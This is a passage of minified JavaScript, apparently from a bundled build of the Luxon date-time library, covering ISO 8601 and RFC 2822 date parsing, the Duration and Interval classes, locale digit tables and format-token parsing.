Array(t),n=0;n<t;n++)e[n]=arguments[n];return function(t){return e.reduce((function(e,n){var r=e[0],a=e[1],i=e[2],o=n(t,i),s=o[0],c=o[1],l=o[2];return[Object.assign(r,s),a||c,l]}),[{},null,1]).slice(0,2)}}function me(t){if(null==t)return[null,null];for(var e=arguments.length,n=new Array(e>1?e-1:0),r=1;r<e;r++)n[r-1]=arguments[r];for(var a=0,i=n;a<i.length;a++){var o=i[a],s=o[0],c=o[1],l=s.exec(t);if(l)return c(l)}return[null,null]}function ve(){for(var t=arguments.length,e=new Array(t),n=0;n<t;n++)e[n]=arguments[n];return function(t,n){var r,a={};for(r=0;r<e.length;r++)a[e[r]]=rt(t[n+r]);return[a,null,n+r]}}var ge=/(?:(Z)|([+-]\d\d)(?::?(\d\d))?)/,ye=/(\d\d)(?::?(\d\d)(?::?(\d\d)(?:[.,](\d{1,30}))?)?)?/,be=RegExp(""+ye.source+ge.source+"?"),we=RegExp("(?:T"+be.source+")?"),Ce=ve("weekYear","weekNumber","weekDay"),ke=ve("year","ordinal"),Se=RegExp(ye.source+" ?(?:"+ge.source+"|("+yt.source+"))?"),xe=RegExp("(?: "+Se.source+")?");function Te(t,e,n){var r=t[e];return W(r)?n:rt(r)}function Oe(t,e){return[{year:Te(t,e),month:Te(t,e+1,1),day:Te(t,e+2,1)},null,e+3]}function je(t,e){return[{hours:Te(t,e,0),minutes:Te(t,e+1,0),seconds:Te(t,e+2,0),milliseconds:at(t[e+3])},null,e+4]}function Ee(t,e){var n=!t[e]&&!t[e+1],r=ht(t[e+1],t[e+2]);return[{},n?null:Wt.instance(r),e+3]}function Me(t,e){return[{},t[e]?Ut.create(t[e]):null,e+1]}var Ie=RegExp("^T?"+ye.source+"$"),De=/^-?P(?:(?:(-?\d{1,9})Y)?(?:(-?\d{1,9})M)?(?:(-?\d{1,9})W)?(?:(-?\d{1,9})D)?(?:T(?:(-?\d{1,9})H)?(?:(-?\d{1,9})M)?(?:(-?\d{1,20})(?:[.,](-?\d{1,9}))?S)?)?)$/;function _e(t){var e=t[0],n=t[1],r=t[2],a=t[3],i=t[4],o=t[5],s=t[6],c=t[7],l=t[8],u="-"===e[0],d=function(t){return t&&u?-t:t};return[{years:d(rt(n)),months:d(rt(r)),weeks:d(rt(a)),days:d(rt(i)),hours:d(rt(o)),minutes:d(rt(s)),seconds:d(rt(c)),milliseconds:d(at(l))}]}var Ne={GMT:0,EDT:-240,EST:-300,CDT:-300,CST:-360,MDT:-360,MST:-420,PDT:-420,PST:-480};function Fe(t,e,n,r,a,i,o){var s={year:2===e.length?dt(rt(e)):rt(e),month:Ct.indexOf(n)+1,day:rt(r),hour:rt(a),minute:rt(i)};return o&&(s.second=rt(o)),t&&(s.weekday=t.length>3?xt.indexOf(t)+1:Tt.indexOf(t)+1),s}var Ae=/^(?:(Mon|Tue|Wed|Thu|Fri|Sat|Sun),\s)?(\d{1,2})\s(Jan|Feb|Mar|Apr|May|Jun|Jul|Aug|Sep|Oct|Nov|Dec)\s(\d{2,4})\s(\d\d):(\d\d)(?::(\d\d))?\s(?:(UT|GMT|[ECMP][SD]T)|([Zz])|(?:([+-]\d\d)(\d\d)))$/;function Le(t){var e,n=t[1],r=t[2],a=t[3],i=t[4],o=t[5],s=t[6],c=t[7],l=t[8],u=t[9],d=t[10],f=t[11],h=Fe(n,i,a,r,o,s,c);return e=l?Ne[l]:u?0:ht(d,f),[h,new Wt(e)]}var Pe=/^(Mon|Tue|Wed|Thu|Fri|Sat|Sun), (\d\d) (Jan|Feb|Mar|Apr|May|Jun|Jul|Aug|Sep|Oct|Nov|Dec) (\d{4}) (\d\d):(\d\d):(\d\d) GMT$/,Ve=/^(Monday|Tuesday|Wedsday|Thursday|Friday|Saturday|Sunday), (\d\d)-(Jan|Feb|Mar|Apr|May|Jun|Jul|Aug|Sep|Oct|Nov|Dec)-(\d\d) (\d\d):(\d\d):(\d\d) GMT$/,Re=/^(Mon|Tue|Wed|Thu|Fri|Sat|Sun) (Jan|Feb|Mar|Apr|May|Jun|Jul|Aug|Sep|Oct|Nov|Dec) ( \d|\d\d) (\d\d):(\d\d):(\d\d) (\d{4})$/;function ze(t){var e=t[1],n=t[2],r=t[3];return[Fe(e,t[4],r,n,t[5],t[6],t[7]),Wt.utcInstance]}function qe(t){var e=t[1],n=t[2],r=t[3],a=t[4],i=t[5],o=t[6];return[Fe(e,t[7],n,r,a,i,o),Wt.utcInstance]}var He=he(/([+-]\d{6}|\d{4})(?:-?(\d\d)(?:-?(\d\d))?)?/,we),$e=he(/(\d{4})-?W(\d\d)(?:-?(\d))?/,we),Ue=he(/(\d{4})-?(\d{3})/,we),Ze=he(be),We=pe(Oe,je,Ee),Ge=pe(Ce,je,Ee),Be=pe(ke,je),Je=pe(je,Ee);var Ye=pe(je);var Qe=he(/(\d{4})-(\d\d)-(\d\d)/,xe),Ke=he(Se),Xe=pe(Oe,je,Ee,Me),tn=pe(je,Ee,Me);var en={weeks:{days:7,hours:168,minutes:10080,seconds:604800,milliseconds:6048e5},days:{hours:24,minutes:1440,seconds:86400,milliseconds:864e5},hours:{minutes:60,seconds:3600,milliseconds:36e5},minutes:{seconds:60,milliseconds:6e4},seconds:{milliseconds:1e3}},nn=Object.assign({years:{quarters:4,months:12,weeks:52,days:365,hours:8760,minutes:525600,seconds:31536e3,milliseconds:31536e6},quarters:{months:3,weeks:13,days:91,hours:2184,minutes:131040,seconds:7862400,milliseconds:78624e5},months:{weeks:4,days:30,hours:720,minutes:43200,seconds:2592e3,milliseconds:2592e6}},en),rn=Object.assign({years:{quarters:4,months:12,weeks:52.1775,days:365.2425,hours:8765.82,minutes:525949.2,seconds:525949.2*60,milliseconds:525949.2*60*1e3},quarters:{months:3,weeks:13.044375,days:91.310625,hours:2191.455,minutes:131487.3,seconds:525949.2*60/4,milliseconds:7889237999.999999},months:{weeks:30.436875/7,days:30.436875,hours:730.485,minutes:43829.1,seconds:2629746,milliseconds:2629746e3}},en),an=["years","quarters","months","weeks","days","hours","minutes","seconds","milliseconds"],on=an.slice(0).reverse();function sn(t,e,n){void 0===n&&(n=!1);var r={values:n?e.values:Object.assign({},t.values,e.values||{}),loc:t.loc.clone(e.loc),conversionAccuracy:e.conversionAccuracy||t.conversionAccuracy};return new ln(r)}function cn(t,e,n,r,a){var i=t[a][n],o=e[n]/i,s=!(Math.sign(o)===Math.sign(r[a]))&&0!==r[a]&&Math.abs(o)<=1?function(t){return t<0?Math.floor(t):Math.ceil(t)}(o):Math.trunc(o);r[a]+=s,e[n]-=s*i}var ln=function(){function t(t){var e="longterm"===t.conversionAccuracy||!1;this.values=t.values,this.loc=t.loc||fe.create(),this.conversionAccuracy=e?"longterm":"casual",this.invalid=t.invalid||null,this.matrix=e?rn:nn,this.isLuxonDuration=!0}t.fromMillis=function(e,n){return t.fromObject(Object.assign({milliseconds:e},n))},t.fromObject=function(e){if(null==e||"object"!=typeof e)throw new b("Duration.fromObject: argument expected to be an object, got "+(null===e?"null":typeof e));return new t({values:mt(e,t.normalizeUnit,["locale","numberingSystem","conversionAccuracy","zone"]),loc:fe.fromObject(e),conversionAccuracy:e.conversionAccuracy})},t.fromISO=function(e,n){var r=function(t){return me(t,[De,_e])}(e)[0];if(r){var a=Object.assign(r,n);return t.fromObject(a)}return t.invalid("unparsable",'the input "'+e+"\" can't be parsed as ISO 8601")},t.fromISOTime=function(e,n){var r=function(t){return me(t,[Ie,Ye])}(e)[0];if(r){var a=Object.assign(r,n);return t.fromObject(a)}return t.invalid("unparsable",'the input "'+e+"\" can't be parsed as ISO 8601")},t.invalid=function(e,n){if(void 0===n&&(n=null),!e)throw new b("need to specify a reason the Duration is invalid");var r=e instanceof Lt?e:new Lt(e,n);if(ee.throwOnInvalid)throw new v(r);return new t({invalid:r})},t.normalizeUnit=function(t){var e={year:"years",years:"years",quarter:"quarters",quarters:"quarters",month:"months",months:"months",week:"weeks",weeks:"weeks",day:"days",days:"days",hour:"hours",hours:"hours",minute:"minutes",minutes:"minutes",second:"seconds",seconds:"seconds",millisecond:"milliseconds",milliseconds:"milliseconds"}[t?t.toLowerCase():t];if(!e)throw new y(t);return e},t.isDuration=function(t){return t&&t.isLuxonDuration||!1};var e=t.prototype;return e.toFormat=function(t,e){void 0===e&&(e={});var n=Object.assign({},e,{floor:!1!==e.round&&!1!==e.floor});return this.isValid?At.create(this.loc,n).formatDurationFromString(this,t):"Invalid Duration"},e.toObject=function(t){if(void 0===t&&(t={}),!this.isValid)return{};var e=Object.assign({},this.values);return t.includeConfig&&(e.conversionAccuracy=this.conversionAccuracy,e.numberingSystem=this.loc.numberingSystem,e.locale=this.loc.locale),e},e.toISO=function(){if(!this.isValid)return null;var t="P";return 0!==this.years&&(t+=this.years+"Y"),0===this.months&&0===this.quarters||(t+=this.months+3*this.quarters+"M"),0!==this.weeks&&(t+=this.weeks+"W"),0!==this.days&&(t+=this.days+"D"),0===this.hours&&0===this.minutes&&0===this.seconds&&0===this.milliseconds||(t+="T"),0!==this.hours&&(t+=this.hours+"H"),0!==this.minutes&&(t+=this.minutes+"M"),0===this.seconds&&0===this.milliseconds||(t+=it(this.seconds+this.milliseconds/1e3,3)+"S"),"P"===t&&(t+="T0S"),t},e.toISOTime=function(t){if(void 0===t&&(t={}),!this.isValid)return null;var e=this.toMillis();if(e<0||e>=864e5)return null;t=Object.assign({suppressMilliseconds:!1,suppressSeconds:!1,includePrefix:!1,format:"extended"},t);var n=this.shiftTo("hours","minutes","seconds","milliseconds"),r="basic"===t.format?"hhmm":"hh:mm";t.suppressSeconds&&0===n.seconds&&0===n.milliseconds||(r+="basic"===t.format?"ss":":ss",t.suppressMilliseconds&&0===n.milliseconds||(r+=".SSS"));var a=n.toFormat(r);return t.includePrefix&&(a="T"+a),a},e.toJSON=function(){return this.toISO()},e.toString=function(){return this.toISO()},e.toMillis=function(){return this.as("milliseconds")},e.valueOf=function(){return this.toMillis()},e.plus=function(t){if(!this.isValid)return this;for(var e,n=un(t),r={},a=f(an);!(e=a()).done;){var i=e.value;(tt(n.values,i)||tt(this.values,i))&&(r[i]=n.get(i)+this.get(i))}return sn(this,{values:r},!0)},e.minus=function(t){if(!this.isValid)return this;var e=un(t);return this.plus(e.negate())},e.mapUnits=function(t){if(!this.isValid)return this;for(var e={},n=0,r=Object.keys(this.values);n<r.length;n++){var a=r[n];e[a]=pt(t(this.values[a],a))}return sn(this,{values:e},!0)},e.get=function(e){return this[t.normalizeUnit(e)]},e.set=function(e){return this.isValid?sn(this,{values:Object.assign(this.values,mt(e,t.normalizeUnit,[]))}):this},e.reconfigure=function(t){var e=void 0===t?{}:t,n=e.locale,r=e.numberingSystem,a=e.conversionAccuracy,i={loc:this.loc.clone({locale:n,numberingSystem:r})};return a&&(i.conversionAccuracy=a),sn(this,i)},e.as=function(t){return this.isValid?this.shiftTo(t).get(t):NaN},e.normalize=function(){if(!this.isValid)return this;var t=this.toObject();return function(t,e){on.reduce((function(n,r){return W(e[r])?n:(n&&cn(t,e,n,e,r),r)}),null)}(this.matrix,t),sn(this,{values:t},!0)},e.shiftTo=function(){for(var e=arguments.length,n=new Array(e),r=0;r<e;r++)n[r]=arguments[r];if(!this.isValid)return this;if(0===n.length)return this;n=n.map((function(e){return t.normalizeUnit(e)}));for(var a,i,o={},s={},c=this.toObject(),l=f(an);!(i=l()).done;){var u=i.value;if(n.indexOf(u)>=0){a=u;var d=0;for(var h in s)d+=this.matrix[h][u]*s[h],s[h]=0;G(c[u])&&(d+=c[u]);var p=Math.trunc(d);for(var m in o[u]=p,s[u]=d-p,c)an.indexOf(m)>an.indexOf(u)&&cn(this.matrix,c,m,o,u)}else G(c[u])&&(s[u]=c[u])}for(var v in s)0!==s[v]&&(o[a]+=v===a?s[v]:s[v]/this.matrix[a][v]);return sn(this,{values:o},!0).normalize()},e.negate=function(){if(!this.isValid)return this;for(var t={},e=0,n=Object.keys(this.values);e<n.length;e++){var r=n[e];t[r]=-this.values[r]}return sn(this,{values:t},!0)},e.equals=function(t){if(!this.isValid||!t.isValid)return!1;if(!this.loc.equals(t.loc))return!1;for(var e,n=f(an);!(e=n()).done;){var r=e.value;if(a=this.values[r],i=t.values[r],!(void 0===a||0===a?void 0===i||0===i:a===i))return!1}var a,i;return!0},a(t,[{key:"locale",get:function(){return this.isValid?this.loc.locale:null}},{key:"numberingSystem",get:function(){return this.isValid?this.loc.numberingSystem:null}},{key:"years",get:function(){return this.isValid?this.values.years||0:NaN}},{key:"quarters",get:function(){return this.isValid?this.values.quarters||0:NaN}},{key:"months",get:function(){return this.isValid?this.values.months||0:NaN}},{key:"weeks",get:function(){return this.isValid?this.values.weeks||0:NaN}},{key:"days",get:function(){return this.isValid?this.values.days||0:NaN}},{key:"hours",get:function(){return this.isValid?this.values.hours||0:NaN}},{key:"minutes",get:function(){return this.isValid?this.values.minutes||0:NaN}},{key:"seconds",get:function(){return this.isValid?this.values.seconds||0:NaN}},{key:"milliseconds",get:function(){return this.isValid?this.values.milliseconds||0:NaN}},{key:"isValid",get:function(){return null===this.invalid}},{key:"invalidReason",get:function(){return this.invalid?this.invalid.reason:null}},{key:"invalidExplanation",get:function(){return this.invalid?this.invalid.explanation:null}}]),t}();function un(t){if(G(t))return ln.fromMillis(t);if(ln.isDuration(t))return t;if("object"==typeof t)return ln.fromObject(t);throw new b("Unknown duration argument "+t+" of type "+typeof t)}var dn="Invalid Interval";function fn(t,e){return t&&t.isValid?e&&e.isValid?e<t?hn.invalid("end before start","The end of an interval must be after its start, but you had start="+t.toISO()+" and end="+e.toISO()):null:hn.invalid("missing or invalid end"):hn.invalid("missing or invalid start")}var hn=function(){function t(t){this.s=t.start,this.e=t.end,this.invalid=t.invalid||null,this.isLuxonInterval=!0}t.invalid=function(e,n){if(void 0===n&&(n=null),!e)throw new b("need to specify a reason the Interval is invalid");var r=e instanceof Lt?e:new Lt(e,n);if(ee.throwOnInvalid)throw new m(r);return new t({invalid:r})},t.fromDateTimes=function(e,n){var r=dr(e),a=dr(n),i=fn(r,a);return null==i?new t({start:r,end:a}):i},t.after=function(e,n){var r=un(n),a=dr(e);return t.fromDateTimes(a,a.plus(r))},t.before=function(e,n){var r=un(n),a=dr(e);return t.fromDateTimes(a.minus(r),a)},t.fromISO=function(e,n){var r=(e||"").split("/",2),a=r[0],i=r[1];if(a&&i){var o,s,c,l;try{s=(o=ur.fromISO(a,n)).isValid}catch(i){s=!1}try{l=(c=ur.fromISO(i,n)).isValid}catch(i){l=!1}if(s&&l)return t.fromDateTimes(o,c);if(s){var u=ln.fromISO(i,n);if(u.isValid)return t.after(o,u)}else if(l){var d=ln.fromISO(a,n);if(d.isValid)return t.before(c,d)}}return t.invalid("unparsable",'the input "'+e+"\" can't be parsed as ISO 8601")},t.isInterval=function(t){return t&&t.isLuxonInterval||!1};var e=t.prototype;return e.length=function(t){return void 0===t&&(t="milliseconds"),this.isValid?this.toDuration.apply(this,[t]).get(t):NaN},e.count=function(t){if(void 0===t&&(t="milliseconds"),!this.isValid)return NaN;var e=this.start.startOf(t),n=this.end.startOf(t);return Math.floor(n.diff(e,t).get(t))+1},e.hasSame=function(t){return!!this.isValid&&(this.isEmpty()||this.e.minus(1).hasSame(this.s,t))},e.isEmpty=function(){return this.s.valueOf()===this.e.valueOf()},e.isAfter=function(t){return!!this.isValid&&this.s>t},e.isBefore=function(t){return!!this.isValid&&this.e<=t},e.contains=function(t){return!!this.isValid&&(this.s<=t&&this.e>t)},e.set=function(e){var n=void 0===e?{}:e,r=n.start,a=n.end;return this.isValid?t.fromDateTimes(r||this.s,a||this.e):this},e.splitAt=function(){var e=this;if(!this.isValid)return[];for(var n=arguments.length,r=new Array(n),a=0;a<n;a++)r[a]=arguments[a];for(var i=r.map(dr).filter((function(t){return e.contains(t)})).sort(),o=[],s=this.s,c=0;s<this.e;){var l=i[c]||this.e,u=+l>+this.e?this.e:l;o.push(t.fromDateTimes(s,u)),s=u,c+=1}return o},e.splitBy=function(e){var n=un(e);if(!this.isValid||!n.isValid||0===n.as("milliseconds"))return[];for(var r,a,i=this.s,o=[];i<this.e;)a=+(r=i.plus(n))>+this.e?this.e:r,o.push(t.fromDateTimes(i,a)),i=a;return o},e.divideEqually=function(t){return this.isValid?this.splitBy(this.length()/t).slice(0,t):[]},e.overlaps=function(t){return this.e>t.s&&this.s<t.e},e.abutsStart=function(t){return!!this.isValid&&+this.e==+t.s},e.abutsEnd=function(t){return!!this.isValid&&+t.e==+this.s},e.engulfs=function(t){return!!this.isValid&&(this.s<=t.s&&this.e>=t.e)},e.equals=function(t){return!(!this.isValid||!t.isValid)&&(this.s.equals(t.s)&&this.e.equals(t.e))},e.intersection=function(e){if(!this.isValid)return this;var n=this.s>e.s?this.s:e.s,r=this.e<e.e?this.e:e.e;return n>r?null:t.fromDateTimes(n,r)},e.union=function(e){if(!this.isValid)return this;var n=this.s<e.s?this.s:e.s,r=this.e>e.e?this.e:e.e;return t.fromDateTimes(n,r)},t.merge=function(t){var e=t.sort((function(t,e){return t.s-e.s})).reduce((function(t,e){var n=t[0],r=t[1];return r?r.overlaps(e)||r.abutsStart(e)?[n,r.union(e)]:[n.concat([r]),e]:[n,e]}),[[],null]),n=e[0],r=e[1];return r&&n.push(r),n},t.xor=function(e){for(var n,r,a=null,i=0,o=[],s=e.map((function(t){return[{time:t.s,type:"s"},{time:t.e,type:"e"}]})),c=f((n=Array.prototype).concat.apply(n,s).sort((function(t,e){return t.time-e.time})));!(r=c()).done;){var l=r.value;1===(i+="s"===l.type?1:-1)?a=l.time:(a&&+a!=+l.time&&o.push(t.fromDateTimes(a,l.time)),a=null)}return t.merge(o)},e.difference=function(){for(var e=this,n=arguments.length,r=new Array(n),a=0;a<n;a++)r[a]=arguments[a];return t.xor([this].concat(r)).map((function(t){return e.intersection(t)})).filter((function(t){return t&&!t.isEmpty()}))},e.toString=function(){return this.isValid?"["+this.s.toISO()+" – "+this.e.toISO()+")":dn},e.toISO=function(t){return this.isValid?this.s.toISO(t)+"/"+this.e.toISO(t):dn},e.toISODate=function(){return this.isValid?this.s.toISODate()+"/"+this.e.toISODate():dn},e.toISOTime=function(t){return this.isValid?this.s.toISOTime(t)+"/"+this.e.toISOTime(t):dn},e.toFormat=function(t,e){var n=(void 0===e?{}:e).separator,r=void 0===n?" – ":n;return this.isValid?""+this.s.toFormat(t)+r+this.e.toFormat(t):dn},e.toDuration=function(t,e){return this.isValid?this.e.diff(this.s,t,e):ln.invalid(this.invalidReason)},e.mapEndpoints=function(e){return t.fromDateTimes(e(this.s),e(this.e))},a(t,[{key:"start",get:function(){return this.isValid?this.s:null}},{key:"end",get:function(){return this.isValid?this.e:null}},{key:"isValid",get:function(){return null===this.invalidReason}},{key:"invalidReason",get:function(){return this.invalid?this.invalid.reason:null}},{key:"invalidExplanation",get:function(){return this.invalid?this.invalid.explanation:null}}]),t}(),pn=function(){function t(){}return t.hasDST=function(t){void 0===t&&(t=ee.defaultZone);var e=ur.now().setZone(t).set({month:12});return!t.universal&&e.offset!==e.set({month:6}).offset},t.isValidIANAZone=function(t){return Ut.isValidSpecifier(t)&&Ut.isValidZone(t)},t.normalizeZone=function(t){return Bt(t,ee.defaultZone)},t.months=function(t,e){void 0===t&&(t="long");var n=void 0===e?{}:e,r=n.locale,a=void 0===r?null:r,i=n.numberingSystem,o=void 0===i?null:i,s=n.outputCalendar,c=void 0===s?"gregory":s;return fe.create(a,o,c).months(t)},t.monthsFormat=function(t,e){void 0===t&&(t="long");var n=void 0===e?{}:e,r=n.locale,a=void 0===r?null:r,i=n.numberingSystem,o=void 0===i?null:i,s=n.outputCalendar,c=void 0===s?"gregory":s;return fe.create(a,o,c).months(t,!0)},t.weekdays=function(t,e){void 0===t&&(t="long");var n=void 0===e?{}:e,r=n.locale,a=void 0===r?null:r,i=n.numberingSystem,o=void 0===i?null:i;return fe.create(a,o,null).weekdays(t)},t.weekdaysFormat=function(t,e){void 0===t&&(t="long");var n=void 0===e?{}:e,r=n.locale,a=void 0===r?null:r,i=n.numberingSystem,o=void 0===i?null:i;return fe.create(a,o,null).weekdays(t,!0)},t.meridiems=function(t){var e=(void 0===t?{}:t).locale,n=void 0===e?null:e;return fe.create(n).meridiems()},t.eras=function(t,e){void 0===t&&(t="short");var n=(void 0===e?{}:e).locale,r=void 0===n?null:n;return fe.create(r,null,"gregory").eras(t)},t.features=function(){var t=!1,e=!1,n=!1,r=!1;if(J()){t=!0,e=Y(),r=Q();try{n="America/New_York"===new Intl.DateTimeFormat("en",{timeZone:"America/New_York"}).resolvedOptions().timeZone}catch(t){n=!1}}return{intl:t,intlTokens:e,zones:n,relative:r}},t}();function mn(t,e){var n=function(t){return t.toUTC(0,{keepLocalTime:!0}).startOf("day").valueOf()},r=n(e)-n(t);return Math.floor(ln.fromMillis(r).as("days"))}function vn(t,e,n,r){var a=function(t,e,n){for(var r,a,i={},o=0,s=[["years",function(t,e){return e.year-t.year}],["quarters",function(t,e){return e.quarter-t.quarter}],["months",function(t,e){return e.month-t.month+12*(e.year-t.year)}],["weeks",function(t,e){var n=mn(t,e);return(n-n%7)/7}],["days",mn]];o<s.length;o++){var c=s[o],l=c[0],u=c[1];if(n.indexOf(l)>=0){var d;r=l;var f,h=u(t,e);if((a=t.plus(((d={})[l]=h,d)))>e)t=t.plus(((f={})[l]=h-1,f)),h-=1;else t=a;i[l]=h}}return[t,i,a,r]}(t,e,n),i=a[0],o=a[1],s=a[2],c=a[3],l=e-i,u=n.filter((function(t){return["hours","minutes","seconds","milliseconds"].indexOf(t)>=0}));if(0===u.length){var d;if(s<e)s=i.plus(((d={})[c]=1,d));s!==i&&(o[c]=(o[c]||0)+l/(s-i))}var f,h=ln.fromObject(Object.assign(o,r));return u.length>0?(f=ln.fromMillis(l,r)).shiftTo.apply(f,u).plus(h):h}var gn={arab:"[٠-٩]",arabext:"[۰-۹]",bali:"[᭐-᭙]",beng:"[০-৯]",deva:"[०-९]",fullwide:"[０-９]",gujr:"[૦-૯]",hanidec:"[〇|一|二|三|四|五|六|七|八|九]",khmr:"[០-៩]",knda:"[೦-೯]",laoo:"[໐-໙]",limb:"[᥆-᥏]",mlym:"[൦-൯]",mong:"[᠐-᠙]",mymr:"[၀-၉]",orya:"[୦-୯]",tamldec:"[௦-௯]",telu:"[౦-౯]",thai:"[๐-๙]",tibt:"[༠-༩]",latn:"\\d"},yn={arab:[1632,1641],arabext:[1776,1785],bali:[6992,7001],beng:[2534,2543],deva:[2406,2415],fullwide:[65296,65303],gujr:[2790,2799],khmr:[6112,6121],knda:[3302,3311],laoo:[3792,3801],limb:[6470,6479],mlym:[3430,3439],mong:[6160,6169],mymr:[4160,4169],orya:[2918,2927],tamldec:[3046,3055],telu:[3174,3183],thai:[3664,3673],tibt:[3872,3881]},bn=gn.hanidec.replace(/[\[|\]]/g,"").split("");function wn(t,e){var n=t.numberingSystem;return void 0===e&&(e=""),new RegExp(""+gn[n||"latn"]+e)}function Cn(t,e){return void 0===e&&(e=function(t){return t}),{regex:t,deser:function(t){var n=t[0];return e(function(t){var e=parseInt(t,10);if(isNaN(e)){e="";for(var n=0;n<t.length;n++){var r=t.charCodeAt(n);if(-1!==t[n].search(gn.hanidec))e+=bn.indexOf(t[n]);else for(var a in yn){var i=yn[a],o=i[0],s=i[1];r>=o&&r<=s&&(e+=r-o)}}return parseInt(e,10)}return e}(n))}}}var kn="( |"+String.fromCharCode(160)+")",Sn=new RegExp(kn,"g");function xn(t){return t.replace(/\./g,"\\.?").replace(Sn,kn)}function Tn(t){return t.replace(/\./g,"").replace(Sn," ").toLowerCase()}function On(t,e){return null===t?null:{regex:RegExp(t.map(xn).join("|")),deser:function(n){var r=n[0];return t.findIndex((function(t){return Tn(r)===Tn(t)}))+e}}}function jn(t,e){return{regex:t,deser:function(t){return ht(t[1],t[2])},groups:e}}function En(t){return{regex:t,deser:function(t){return t[0]}}}var Mn={year:{"2-digit":"yy",numeric:"yyyyy"},month:{numeric:"M","2-digit":"MM",short:"MMM",long:"MMMM"},day:{numeric:"d","2-digit":"dd"},weekday:{short:"EEE",long:"EEEE"},dayperiod:"a",dayPeriod:"a",hour:{numeric:"h","2-digit":"hh"},minute:{numeric:"m","2-digit":"mm"},second:{numeric:"s","2-digit":"ss"}};var In=null;function Dn(t,e){if(t.literal)return t;var n=At.macroTokenToFormatOpts(t.val);if(!n)return t;var r=At.create(e,n).formatDateTimeParts((In||(In=ur.fromMillis(1555555555555)),In)).map((function(t){return function(t,e,n){var r=t.type,a=t.value;if("literal"===r)return{literal:!0,val:a};var i=n[r],o=Mn[r];return"object"==typeof o&&(o=o[i]),o?{literal:!1,val:o}:void 0}(t,0,n)}));return r.includes(void 0)?t:r}function _n(t,e,n){var r=function(t,e){var n;return(n=Array.prototype).concat.apply(n,t.map((function(t){return Dn(t,e)})))}(At.parseFormat(n),t),a=r.map((function(e){return n=e,a=wn(r=t),i=wn(r,"{2}"),o=wn(r,"{3}"),s=wn(r,"{4}"),c=wn(r,"{6}"),l=wn(r,"{1,2}"),u=wn(r,"{1,3}"),d=wn(r,"{1,6}"),f=wn(r,"{1,9}"),h=wn(r,"{2,4}"),p=wn(r,"{4,6}"),m=function(t){return{regex:RegExp((e=t.val,e.replace(/[\-\[\]{}()*+?.,\\\^$|#\s]/g,"\\$&"))),deser:function(t){return t[0]},literal:!0};var e},(v=function(t){if(n.literal)return m(t);switch(t.val){case"G":return On(r.eras("short",!1),0);case"GG":return On(r.eras("long",!1),0);case"y":return Cn(d);case"yy":return Cn(h,dt);case"yyyy":return Cn(s);case"yyyyy":return Cn(p);case"yyyyyy":return Cn(c);case"M":return Cn(l);case"MM":return Cn(i);case"MMM":return On(r.months("short",!0,!1),1);case"MMMM":return On(r.months("long",!0,!1),1);case"L":return Cn(l);case"LL":return Cn(i);case"LLL":return On(r.months("short",!1,!1),1);case"LLLL":return On(r.months("long",!1,!1),1);case"d":return Cn(l);case"dd":return Cn(i);case"o":return Cn(u);case"ooo":return Cn(o);case"HH":return Cn(i);case"H":return Cn(l);case"hh":return Cn(i);case"h":return Cn(l);case"mm":return Cn(i);case"m":case"q":return Cn(l);case"qq":return Cn(i);case"s":return Cn(l);case"ss":return Cn(i);case"S":return Cn(u);case"SSS":return Cn(o);case"u":return En(f);case"a":return On(r.meridiems(),0);case"kkkk":return Cn(s);case"kk":return Cn(h,dt);case"W":return Cn(l);case"WW":return Cn(i);case"E":case"c":return Cn(a);case"EEE":return On(r.weekdays("short",!1,!1),1);case"EEEE":return On(r.weekdays("long",!1,!1),1);case"ccc":return On(r.weekdays("short",!0,!1),1);case"cccc":return On(r.weekdays("long",!0,!1),1);case"Z":case"ZZ":return jn(new RegExp("([+-]"+l.source+")(?::("+i.source+"))?"),2);case"ZZZ":return jn(new RegExp("([+-]"+l.source+")("+i.source+")?"),2);case"z":return En(/[a-z_+-/]{1,256}?/i);default:return m(t)}}(n)||{invalidReason:"missing Intl.DateTimeFormat.formatToParts support"}).token=n,v;var n,r,a,i,o,s,c,l,u,d,f,h,p,m,v})),i=a.find((function(t){return t.invalidReason}));if(i)return{input:e,tokens:r,invalidReason:i.invalidReason};var o=function(t){return["^"+t.map((function(t){return t.regex})).reduce((function(t,e){return t+"("+e.source+")"}),"")+"$",t]}(a),s=o[0],c=o[1],l=RegExp(s,"i"),u=function(t,e,n){var r=t.match(e);if(r){var a={},i=1;for(var o in n)if(tt(n,o)){var s=n[o],c=s.groups?s.groups+1:1;!s.literal&&s.token&&(a[s.token.val[0]]=s.deser(r.slice(i,i+c))),i+=c}return[r,a]}return[r,{}]}(e,l,c),d=u[0],f=u[1],h=f?function(t){var e;return e=W(t.Z)?W(t.z)?null:Ut.create(t.z):new Wt(t.Z),W(t.q)||(t.M=3*(t.q-1)+1),W(t.h)||(t.h<12&&1===t.a?t.h+=12:12===t.h&&0===t.a&&(t.h=0)),0===t.G&&t.y&&(t.y=-t.y),W(t.u)||(t.S=at(t.u)),[Object.keys(t).reduce((function(e,n){var r=function(t){switch(t){case"S":return"millisecond";case"s":return"second";case"m":return"minute";case"h":case"H":return"hour";case"d":return"day";case"o":return"ordinal";case"L":case"M":return"month";case"y":return"year";case"E":case"c":return"weekday";case"W":return"weekNumber";case"k":return"weekYear";case"q":return"quarter";default:return null}}(n);return r&&(e[r]=t[n]),e}),{}),e]}(f):[null,null],p=h[0],m=h[1];if(tt(f,"a")&&tt(f,"H"))throw new g("Can't include meridiem when specifying 24-hour format");return{input:e,tokens:r,regex:l,rawMatches:d,matches:f,result:p,zone:m}}var Nn=[0,31,59,90,120,151,181,212,243,273,304,334],Fn=[0,31,60,91,121,152,182,213,244,274,305,335];function An(t,e){return new Lt("unit out of range","you specified "+e+" (of type "+typeof e+") as a "+t+", which is invalid")}function Ln(t,e,n){var r=new Date(Date.UTC(t,e-1,n)).getUTCDay();return 0===r?7:r}function Pn(t,e,n){return n+(ot(t)?Fn:Nn)[e-1]}function Vn(t,e){var n=ot(t)?Fn:Nn,r=n.findIndex((function(t){return t<e}));return{month:r+1,day:e-n[r]}}function Rn(t){var e,n=t.year,r=t.month,a=t.day,i=Pn(n,r,a),o=Ln(n,r,a),s=Math.floor((i-o+10)/7);return s<1?s=ut(e=n-1):s>ut(n)?(e=n+1,s=1):e=n,Object.assign({weekYear:e,weekNumber:s,weekday:o},gt(t))}function zn(t){var e,n=t.weekYear,r=t.weekNumber,a=t.weekday,i=Ln(n,1,4),o=st(n),s=7*r+a-i-3;s<1?s+=st(e=n-1):s>o?(e=n+1,s-=st(n)):e=n;var c=Vn(e,s),l=c.month,u=c.day;return Object.assign({year:e,month:l,day:u},gt(t))}function qn(t){var e=t.year,n=Pn(e,t.month,t.day);return 